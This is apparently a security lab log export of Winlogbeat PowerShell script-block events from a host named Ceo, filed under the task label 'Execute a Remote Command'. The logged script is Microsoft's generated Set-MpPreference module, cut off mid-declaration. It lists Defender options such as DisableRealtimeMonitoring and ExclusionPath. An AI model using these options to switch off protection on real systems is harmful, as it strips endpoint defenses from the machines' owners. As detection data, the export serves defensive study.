    [Parameter(ParameterSetName='Set0')]
    [Alias('soiie')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ScanOnlyIfIdleEnabled},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('QuickScan','FullScan')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType]
    ${ScanParameters},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${ScanScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scsqst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${ScanScheduleQuickScanTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${ScanScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tfsso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ThrottleForScheduledScanOnly},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigfagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureFirstAuGracePeriod},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureAuGracePeriod},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigdufss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureDefinitionUpdateFileSharesSources},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigduoswo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${SignatureDisableUpdateOnStartupWithoutEngine},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sfo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureFallbackOrder},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ssp','SecurityIntelligenceLocation','ssl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SharedSignaturesPath},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${SignatureScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${SignatureScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('siguci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureUpdateCatchupInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureUpdateInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigbui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureBlobUpdateInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigbfs')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureBlobFileSharesSources},

    [Parameter(ParameterSetName='Set0')]
    [Alias('mcupd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${MeteredConnectionUpdates},

    [Parameter(ParameterSetName='Set0')]
    [Alias('anpws')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowNetworkProtectionOnWinServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddtgp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableDatagramProcessing},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCpuThrottleOnIdleScans},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Basic','Advanced')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType]
    ${MAPSReporting},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType]
    ${SubmitSamplesConsent},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dae')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableAutoExclusions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dpm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisablePrivacyMode},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rstt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${RandomizeScheduleTaskTimes},

    [Parameter(ParameterSetName='Set0')]
    [Alias('srt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SchedulerRandomizationTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dbm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableBehaviorMonitoring},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dips')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableIntrusionPreventionSystem},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dioavp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableIOAVProtection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drtm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRealtimeMonitoring},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dscrptsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScriptScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('darchsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableArchiveScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dcfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCatchupFullScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dcqsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCatchupQuickScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('demsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableEmailScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drdsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRemovableDriveScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRestorePoint},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsmndfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScanningMappedNetworkDrivesForFullScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsnf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScanningNetworkFiles},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${UILockdown},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('unktdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${UnknownThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ltdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${LowThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('mtdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${ModerateThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('htdefac')]
    [ValidateNotNull()]
    

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root\Microsoft\Windows\Defender\MSFT_MpPreference'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Set-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rtsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Both','Incoming','Outcoming')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection]
    ${RealTimeScanDirection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('qpiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${QuarantinePurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${RemediationScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${RemediationScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('raat')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingAdditionalActionTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rcto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingCriticalFailureTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rncto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingNonCriticalTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('shri')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ServiceHealthReportInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rdsde')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ReportDynamicSignatureDroppedEvent},

    [Parameter(ParameterSetName='Set0')]
    [Alias('saclf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [byte]
    ${ScanAvgCPULoadFactor},

    [Parameter(ParameterSetName='Set0')]
    [Alias('csbr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${CheckForSignaturesBeforeRunningScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('spiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ScanPurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('soiie')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ScanOnlyIfIdleEnabled},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('QuickScan','FullScan')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType]
    ${ScanParameters},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${ScanScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scsqst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${ScanScheduleQuickScanTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${ScanScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tfsso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ThrottleForScheduledScanOnly},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigfagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureFirstAuGracePeriod},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureAuGracePeriod},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigdufss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureDefinitionUpdateFileSharesSources},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigduoswo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${SignatureDisableUpdateOnStartupWithoutEngine},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sfo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureFallbackOrder},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ssp','SecurityIntelligenceLocation','ssl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SharedSignaturesPath},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${SignatureScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${SignatureScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('siguci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureUpdateCatchupInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureUpdateInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigbui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SignatureBlobUpdateInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('sigbfs')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${SignatureBlobFileSharesSources},

    [Parameter(ParameterSetName='Set0')]
    [Alias('mcupd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${MeteredConnectionUpdates},

    [Parameter(ParameterSetName='Set0')]
    [Alias('anpws')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowNetworkProtectionOnWinServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddtgp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableDatagramProcessing},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCpuThrottleOnIdleScans},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Basic','Advanced')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType]
    ${MAPSReporting},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType]
    ${SubmitSamplesConsent},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dae')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableAutoExclusions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dpm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisablePrivacyMode},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rstt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${RandomizeScheduleTaskTimes},

    [Parameter(ParameterSetName='Set0')]
    [Alias('srt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${SchedulerRandomizationTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dbm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableBehaviorMonitoring},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dips')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableIntrusionPreventionSystem},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dioavp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableIOAVProtection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drtm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRealtimeMonitoring},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dscrptsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScriptScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('darchsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableArchiveScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dcfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCatchupFullScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dcqsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableCatchupQuickScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('demsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableEmailScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drdsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRemovableDriveScanning},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRestorePoint},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsmndfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScanningMappedNetworkDrivesForFullScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsnf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableScanningNetworkFiles},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${UILockdown},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('unktdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${UnknownThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ltdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${LowThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('mtdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${ModerateThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('htdefac')]
    [ValidateNotNull()]
    ",1,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3330,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",YHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.201",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (2 of 20):
[ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${HighThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('stdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${SevereThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dbaf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableBlockAtFirstSeen},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType]
    ${PUAProtection},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType]
    ${CloudBlockLevel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('cloudextimeout')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${CloudExtendedTimeout},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType]
    ${EnableNetworkProtection},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType]
    ${EnableControlledFolderAccess},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('elcp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableLowCpuPriority},

    [Parameter(ParameterSetName='Set0')]
    [Alias('efhc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableFileHashComputation},

    [Parameter(ParameterSetName='Set0')]
    [Alias('efsobp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableFullScanOnBatteryPower},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ppurl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ProxyPacUrl},

    [Parameter(ParameterSetName='Set0')]
    [Alias('proxsrv')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ProxyServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('proxbps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ProxyBypass},

    [Parameter(ParameterSetName='Set0')]
    [Alias('fupo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ForceUseProxyOnly},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtlsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTlsParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dhttpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableHttpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddnsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableDnsParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddnstcpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
